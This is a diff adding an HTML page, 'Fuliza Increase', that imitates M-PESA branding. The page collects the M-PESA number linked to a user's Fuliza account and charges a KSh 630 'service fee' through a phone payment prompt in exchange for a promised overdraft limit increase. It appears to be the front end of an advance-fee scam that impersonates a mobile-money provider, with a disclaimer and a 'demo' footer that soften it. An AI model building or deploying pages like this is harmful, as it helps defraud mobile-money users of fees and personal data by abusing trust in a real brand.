@@ -1,0 +1,57 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#008c45" />
+  <title>Fuliza Increase</title>
+  <link rel="manifest" href="/manifest.webmanifest" />
+  <link rel="stylesheet" href="/style.css" />
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand"><span class="mark">M</span><span>Fuliza Increase</span></div>
+    <span class="secure">Secure request</span>
+  </header>
+
+  <main class="container">
+    <section class="hero">
+      <p class="eyebrow">M-PESA • FULIZA</p>
+      <h1>Request a Fuliza increase</h1>
+      <p>Choose the increase you want and provide the M-PESA number linked to your Fuliza account.</p>
+    </section>
+
+    <section class="card">
+      <h2>1. Select your increase</h2>
+      <div id="plans" class="plans"></div>
+
+      <h2>2. Enter your M-PESA number</h2>
+      <label for="phone">M-PESA number linked to your Fuliza account</label>
+      <div class="phone-row">
+        <span>+254</span>
+        <input id="phone" inputmode="numeric" autocomplete="tel" maxlength="12" placeholder="712 345 678" />
+      </div>
+      <p class="hint">Example: 0712 345 678 or 712 345 678</p>
+      <p id="error" class="error" role="alert"></p>
+
+      <div class="summary">
+        <div><span>Selected increase</span><strong id="selectedAmount">KSh 15,000</strong></div>
+        <div><span>Service fee</span><strong id="fee">KSh 630</strong></div>
+      </div>
+
+      <button id="requestBtn" class="primary">Request Fuliza Increase</button>
+      <p class="disclaimer">Submitting a request does not guarantee approval. Eligibility and any available Fuliza limit are determined by the applicable service provider's assessment.</p>
+    </section>
+
+    <section id="statusCard" class="card status hidden">
+      <div class="status-icon">✓</div>
+      <h2 id="statusTitle">Payment prompt sent</h2>
+      <p id="statusText">Check your phone and complete the M-PESA prompt.</p>
+      <div class="loader"></div>
+    </section>
+  </main>
+
+  <footer>© 2026 Fuliza Increase Assistance • This demo requires an authorized production payment integration.</footer>
+  <script type="module" src="/app.js"></script>
+</body>
+</html>
